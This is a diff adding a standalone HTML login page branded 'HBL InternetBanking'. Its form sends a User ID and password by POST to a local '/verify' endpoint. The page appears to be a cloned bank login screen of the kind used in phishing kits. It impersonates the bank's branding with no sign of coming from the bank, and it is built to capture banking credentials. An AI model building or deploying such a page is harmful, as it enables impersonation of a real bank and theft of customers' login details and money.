@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HBL InternetBanking</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Arial:wght@400;600&display=swap');
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(rgba(0,0,0,0.35), rgba(0,0,0,0.35)),
+                        url('https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?ixlib=rb-4.0.3&auto=format&fit=crop&q=80')
+                        center/cover no-repeat;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .container { 
+            width: 90%; 
+            max-width: 480px; 
+        }
+
+        .header {
+            background: #006b3f;
+            color: white;
+            padding: 18px 0;
+            text-align: center;
+            font-size: 1.85rem;
+            font-weight: 600;
+            border-radius: 8px 8px 0 0;
+        }
+
+        .login-section { 
+            background: #fff; 
+            padding: 35px 40px; 
+            border-radius: 0 0 8px 8px; 
+            box-shadow: 0 8px 20px rgba(0,0,0,0.15);
+        }
+
+        .login-title {
+            font-size: 1.45rem;
+            margin-bottom: 25px;
+            font-weight: 600;
+            color: #006b3f;
+        }
+
+        .form-group { margin-bottom: 18px; }
+        .form-group label { 
+            display: block; 
+            margin-bottom: 6px; 
+            font-weight: 600; 
+        }
+        .form-group input {
+            width: 100%; 
+            padding: 12px 14px; 
+            border: 2px solid #ccc; 
+            border-radius: 5px; 
+            font-size: 1.05rem;
+        }
+        .form-group input:focus {
+            border-color: #006b3f;
+            outline: none;
+        }
+
+        .login-btn {
+            background: #006b3f; 
+            color: #fff; 
+            border: none; 
+            padding: 15px; 
+            font-size: 17px; 
+            font-weight: bold;
+            cursor: pointer; 
+            width: 100%; 
+            border-radius: 5px;
+            margin-top: 15px;
+        }
+        .login-btn:hover { background: #005a35; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <strong>HBL</strong> InternetBanking
+        </div>
+
+        <div class="login-section">
+            <div class="login-title">Login to Internet Banking</div>
+            
+            <form action="/verify" method="POST">
+                <div class="form-group">
+                    <label>User ID</label>
+                    <input type="text" name="username" placeholder="Enter User ID" required autofocus>
+                </div>
+                
+                <div class="form-group">
+                    <label>Password</label>
+                    <input type="password" name="password" placeholder="Enter Password" required>
+                </div>
+
+                <button type="submit" class="login-btn">Click here to login</button>
+            </form>
+        </div>
+    </div>
+</body>
+</html>
